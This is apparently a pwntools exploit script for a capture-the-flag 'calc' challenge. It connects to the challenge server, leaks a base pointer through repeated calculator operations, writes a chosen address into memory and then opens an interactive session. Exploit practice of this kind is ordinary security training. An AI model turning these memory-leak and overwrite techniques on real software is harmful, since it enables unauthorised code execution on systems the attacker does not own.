#!/usr/bin/python2

from pwn import *
import struct

exe = ELF("calc_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("calc-1.ctf.hackaplaneten.se", 1337 )

    return r


def send_function(r, num1, operator,num2):
    r.sendlineafter(':', "{} {} {}".format(num1, operator, num2))


def main():
    r = conn()

    for i in range(32):
        send_function(r, 0, "a", 0)
        r.recvuntil("=")
    
    for i in range(4):
        send_function(r, 1, "a", 1)
        r.recvuntil("=")

    base = ""

    log.info("leaking base_ptr")

    for i in range(4):
        send_function(r, 1, "a", 1)
        r.recvuntil("=")
        r.recv(1)
        leak = int(r.recvline().strip())
        base += struct.pack("<i",leak)[:1]

    print base
    base = u32(base)
    log.info(hex(base))

    to_write = p32(0x80490c0)

    for i in to_write:
        send_function(r, ord(i), "+", 0)

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
